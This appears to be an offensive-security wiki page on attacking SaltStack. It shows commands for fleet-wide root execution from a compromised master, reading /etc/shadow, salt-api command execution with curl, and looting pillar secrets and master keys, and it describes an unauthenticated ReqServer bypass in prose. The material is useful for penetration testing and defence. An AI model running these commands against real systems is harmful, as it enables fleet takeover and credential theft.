---
title: "SaltStack: abusing the Salt master and salt-api for minion code execution"
description: "Attacking SaltStack: running commands as root on every minion from a compromised master, the unauthenticated master request-server authentication bypass and file-read that yield the root key and arbitrary execution, abusing salt-api external auth, and looting pillar and master configuration for secrets."
keywords:
  - SaltStack
  - salt master
  - salt minion
  - salt-api
  - ClearFuncs
---

# SaltStack

Salt is a master/minion system: minions connect out to the master over ZeroMQ (TCP 4505 for the publish bus, 4506 for the request server), and the master pushes commands that every minion executes as root. Control of the master is root on the entire fleet, and the request server has carried pre-authentication flaws that hand that control to anyone who can reach port 4506.

## Find the master and minions

```bash
nmap -p4505,4506 -sV <target>                    # the ZeroMQ publish and request ports
ls /etc/salt/; ps aux | grep -E 'salt-master|salt-minion|salt-api'
```

## Command the fleet from the master

On a compromised master, Salt's own execution modules run anything on selected minions as root:

```bash
salt '*' test.ping                               # which minions respond
salt '*' cmd.run 'id'                            # run as root on every minion
salt -L 'web1,db1' cmd.run 'cat /etc/shadow'     # target a list
salt '*' cp.get_file salt://x /tmp/x             # push files from the master file server
```

## Unauthenticated master compromise

The master's request server (`ReqServer`) exposed a method dispatch (`ClearFuncs`) that failed to authenticate certain calls, so an attacker who could reach 4506 could invoke internal functions directly: read the master's root key to then sign and publish jobs, and trigger command execution, with no credentials. A companion directory-traversal in the file-serving functions read arbitrary files from the master. Together they are pre-auth remote code execution as root on the master, and therefore on every minion.

```bash
# the mechanism: speak the ReqServer protocol to _prep_auth_info / the file functions
# to retrieve the master root key, then publish a cmd.run job to all minions.
# maintained proof-of-concept tooling drives the exchange against port 4506.
```

Reaching 4506 from the internet or a pivot and finding an unpatched master is a direct fleet takeover; confirm the version before relying on it, these are specific build ranges.

## salt-api and external auth

`salt-api` (the `rest_cherrypy` module) exposes the master over HTTP and authenticates against an external system (PAM, LDAP) selected by `eauth`. Weak or default `eauth` accounts, or an account allowed the `@wheel`/`@runner`/`local` client, reach command execution over HTTP:

```bash
# authenticate, then run a command on all minions through the API
curl -sk https://<master>:8000/login -d username=saltdev -d password=<pw> -d eauth=pam
curl -sk https://<master>:8000/ -H "X-Auth-Token: <token>" \
  -d client=local -d tgt='*' -d fun=cmd.run -d arg='id'
```

## Loot the configuration

The master configuration and pillar data hold secrets and the trust model:

```bash
cat /etc/salt/master                             # file_roots, pillar_roots, external_auth, api users
salt '*' pillar.items                            # pillar data, which routinely carries credentials
ls /etc/salt/pki/master/                         # the master keys and accepted minion keys
```

## Follow-on

A compromised master is root on every minion simultaneously; the pillar secrets and accepted minion keys extend the reach, and the harvested credentials pivot into the directory and cloud accounts they unlock.

## Tools

- `salt`, `salt-run`, `salt-key`: fleet command execution and key management from the master.
- Maintained proof-of-concept tooling for the unauthenticated ReqServer path.

## References

- [Salt remote execution modules (cmd.run)](https://docs.saltproject.io/en/latest/ref/modules/all/salt.modules.cmdmod.html)
- [salt-api / rest_cherrypy](https://docs.saltproject.io/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html)
- [Salt external authentication (eauth)](https://docs.saltproject.io/en/latest/topics/eauth/index.html)
